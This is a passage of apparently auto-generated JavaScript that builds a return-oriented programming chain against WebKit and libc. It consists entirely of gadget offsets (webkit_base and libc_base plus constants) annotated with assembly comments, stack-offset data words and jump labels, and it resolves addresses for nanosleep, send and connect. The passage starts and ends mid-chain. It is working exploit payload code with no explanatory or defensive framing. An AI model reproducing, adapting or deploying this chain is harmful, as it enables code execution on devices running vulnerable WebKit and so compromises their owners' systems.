webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
nanosleep_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+195712, //L3183
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3183:
db([0, 0]); // 0x0
//L3040:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
send_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+197040, //L3184
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3184:
db([0, 0]); // 0x0
//L3166:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([216, 0]); // 0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967072, 4294967295]); // -0xe0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967216, 4294967295]); // -0x50
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+547950, //mov rcx, [rdi + 0x18] ; lea rax, [rax + rcx - 1]
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877 //pop rsi
]);
db([1, 0]); // 0x1
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+198416, //L3185
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3185:
db([0, 0]); // 0x0
//L2981:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
connect_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+199744, //L3186
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3186:
db([0, 0]); // 0x0
//L2891:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
